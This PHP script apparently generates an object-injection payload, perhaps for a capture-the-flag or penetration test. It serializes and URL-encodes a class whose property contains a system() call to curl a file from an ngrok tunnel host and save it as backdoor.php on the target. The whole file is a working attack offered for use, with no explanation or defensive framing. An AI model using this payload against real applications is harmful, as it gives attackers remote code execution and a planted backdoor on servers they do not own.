<?php
	$NGROK_HOST = "0.tcp.eu.ngrok.io";
	$NGROK_PORT = 13000;

	class PHPClass
	{
		public $condition = true;
		public $prop = "";

		public function __construct($host, $port) {
			$this->prop = "system('curl http://".$host.":".$port." -o backdoor.php');";
		}
	}

	echo urlencode(serialize(new PHPClass($NGROK_HOST, $NGROK_PORT)));
?>
